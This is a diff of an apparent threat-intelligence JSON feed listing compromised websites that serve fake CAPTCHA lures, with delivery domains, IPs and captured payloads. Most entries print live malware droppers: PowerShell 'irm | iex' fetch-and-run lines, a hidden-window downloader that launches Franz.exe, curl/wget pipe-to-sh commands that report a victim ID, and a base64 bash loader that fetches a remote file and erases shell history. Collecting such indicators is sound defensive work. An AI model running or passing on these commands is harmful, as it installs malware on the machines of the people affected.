@@ -1,5 +1,68 @@
 [
   {
+    "UrlDomain": "riskiriswandi.com",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.133"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/66a3105c05a5b069",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/66a3105c05a5b069'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/66a3105c05a5b069"
+    ],
+    "ReportId": "cmwx071yw0c8v0omlp9z99b26",
+    "ScannedAt": "2026-11-26T03:39:17.631000+00:00"
+  },
+  {
+    "UrlDomain": "sileajans.com.tr",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwzyajr0bxx0omlfwd0algn",
+    "ScannedAt": "2026-11-26T03:32:28.831000+00:00"
+  },
+  {
+    "UrlDomain": "salihlievdenevenakliye.com.tr",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "104.21.69.207"
+    ],
+    "Related": [
+      {
+        "Value": "friendsoftorreabbey.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwzxhdm0bx10omlwpl054pt",
+    "ScannedAt": "2026-11-26T03:31:51.050000+00:00"
+  },
+  {
     "UrlDomain": "rowantreetheatrecompany.co.uk",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -13642,314 +13705,5 @@
     ],
     "ReportId": "cmwirbap412aj0omlforw99oo",
     "ScannedAt": "2026-11-16T04:21:52.546000+00:00"
-  },
-  {
-    "UrlDomain": "www.leadgg.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app",
-      "2fwww.leadgg.com"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "192.155.100.68"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=32caa379-7611-43b0-a2fe-74bafeda149a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]leadgg[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A59%3A21.605Z&lastShellAt=2026-11-16T03%3A59%3A21.605Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwiqk6ms11vt0omlqorosbni",
-    "ScannedAt": "2026-11-16T04:00:47.573000+00:00"
-  },
-  {
-    "UrlDomain": "airworthymaintenance.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.53.54"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/a062020e66ee07c1",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29913358",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/a062020e66ee07c1'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/a062020e66ee07c1"
-    ],
-    "ReportId": "cmwiqhjjh11sh0oml8cu1s2t0",
-    "ScannedAt": "2026-11-16T03:58:44.306000+00:00"
-  },
-  {
-    "UrlDomain": "www.mahuraweaves.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "2fwww.mahuraweaves.com"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "34.192.234.214"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=be55cd0b-e122-42b4-8fb1-5de23f6c9ad0&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]mahuraweaves[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A54%3A15.736Z&lastShellAt=2026-11-16T03%3A54%3A15.736Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwiqdlya11l50omlixhdz0wc",
-    "ScannedAt": "2026-11-16T03:55:40.814000+00:00"
-  },
-  {
-    "UrlDomain": "precisiontanksystems.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "67.225.216.61"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=3f6b069c-e07a-45bf-aae1-7dc92802a60a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fprecisiontanksystems[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A49%3A16.510Z&lastShellAt=2026-11-16T03%3A49%3A16.510Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwiq75ni11b90omlz644o0ob",
-    "ScannedAt": "2026-11-16T03:50:39.764000+00:00"
-  },
-  {
-    "UrlDomain": "topnotchflood.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "192.185.34.169"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=5d2a6192-05cc-4547-9e5d-91d953f7cdb9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftopnotchflood[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A48%3A48.576Z&lastShellAt=2026-11-16T03%3A48%3A48.576Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwiq6jgp11a10omlcxntkw1s",
-    "ScannedAt": "2026-11-16T03:50:11.027000+00:00"
-  },
-  {
-    "UrlDomain": "qormarketingmanagement.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "135.181.179.114"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=b0b93ea6-abfe-4dc2-b131-bedabb7a95b4&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fqormarketingmanagement[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A44%3A55.133Z&lastShellAt=2026-11-16T03%3A44%3A55.133Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwiq1jh8116k0oml4u9mgy9k",
-    "ScannedAt": "2026-11-16T03:46:17.761000+00:00"
-  },
-  {
-    "UrlDomain": "kp2online.com",
-    "DeliveryUrl": [
-      "script.google.com",
-      "browse-cloud.codes",
-      "softify.lat"
-    ],
-    "PayloadUrl": [
-      "https://softify.lat/u/8ecec3ba",
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/w/8ecec3ba"
-    ],
-    "IP": [
-      "91.108.98.246"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=7d505875-ada6-4cf1-a0e0-5e9424e02e57&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fkp2online[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A44%3A21.900Z&lastShellAt=2026-11-16T03%3A44%3A21.900Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/u/8ecec3ba"
-    ],
-    "ReportId": "cmwiq0vbr11350oml4i7d56wf",
-    "ScannedAt": "2026-11-16T03:45:46.426000+00:00"
-  },
-  {
-    "UrlDomain": "mail.rvh.aio.mybluehost.me",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.253.222"
-    ],
-    "Related": [
-      {
-        "Value": "https://conversations-with-god.com/about-me-speaking-engagements-2/",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://conversations-with-god.com/about-me-speaking-engagements-2/#respond",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://conversations-with-god.com/a16z-generative-ai-11/",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/ced7a9afa43f4429",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29913343",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7461e8c0bb505b66188eb183e88b86881ea65d410314faf5",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/ced7a9afa43f4429'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/ced7a9afa43f4429"
-    ],
-    "ReportId": "cmwipz3ac112d0omlvr4l2afs",
-    "ScannedAt": "2026-11-16T03:44:23.448000+00:00"
-  },
-  {
-    "UrlDomain": "nestverserealty.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "modalelement.classlist.remove",
-      "spinnerelement.style.display"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "91.108.98.86"
-    ],
-    "Related": [
-      {
-        "Value": "https://cinder-anvil-muinplii.pro/t.js?site=fcfe1ab425896f249122018fb8839381",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "curl -sL -d \"id=2ac41923-f21f-470c-9dc2-8159e4e37a0c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fnestverserealty[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A41%3A13.795Z&lastShellAt=2026-11-16T03%3A41%3A13.795Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwipwsdv10xe0omlkv9fh7jh",
-    "ScannedAt": "2026-11-16T03:42:36.015000+00:00"
-  },
-  {
-    "UrlDomain": "casasanvicente.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "212.227.148.197"
-    ],
-    "Related": [
-      {
-        "Value": "https://cinder-anvil-muinplii.pro/t.js?site=24423408b8447e4a2f7fce5c9c7bedc6",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "echo 'I am not a robot - reCAPTCHA Verification ID: 208218' && echo 'ZXhwb3J0IFNSQ19VUkw9J2h0dHBzOi8vY2FzYXNhbnZpY2VudGUuY29tLycgJiYgKGNkIC90bXAgJiYgY3VybCAta2ZzU0wgLS11c2VyLWFnZW50ICdHb1BheWxvYWQtQ0ROLzc0YzE0OWYxMTU0NmRkZjI2NGU2YTVmMjFiNjYzMjI0NWMyMzFiN2Y1ODM1M2UwMDA0YjE4YTc3NTlkY2VmYjAnICJodHRwOi8vODMuMTQxLjkwLjE5L2YwZWM4NWVhMWUiIC1vIC5PUldrWFAgJiYgYmFzaCAuT1JXa1hQICYmIHJtIC1mIC5PUldrWFApID4gL2Rldi9udWxsIDI+JjEgJiBjbGVhcjsgcHJpbnRmICdcMDMzWzNKJzsgaGlzdG9yeSAtZCAkKGhpc3RvcnkgMSAyPi9kZXYvbnVsbCB8IGF3ayAne3ByaW50ICQxfScpIDI+L2Rldi9udWxsOyBmYyAtcCAvZGV2L251bGwgMj4vZGV2L251bGw7IHByaW50ZiAnXG4gIFwwMzNbMzJtXHhlMlx4OWNceDkzIFZlcmlmaWNhdGlvbiBzdWNjZXNzZnVsXDAzM1swbVxuXG4n' | base64 -D | bash",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmwipwjxf10wl0omlyw2jzn8r",
-    "ScannedAt": "2026-11-16T03:42:25.045000+00:00"
-  },
-  {
-    "UrlDomain": "alianzaeducacional.cl",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "208.113.159.23"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
-    ],
-    "ReportId": "cmwipnx5h10rt0omlraf3fb6q",
-    "ScannedAt": "2026-11-16T03:35:42.273000+00:00"
-  },
-  {
-    "UrlDomain": "azobshop.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "159.223.56.62"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
-    ],
-    "ReportId": "cmwipmr8w10qm0omla41u3zjf",
-    "ScannedAt": "2026-11-16T03:34:47.979000+00:00"
   }
 ]
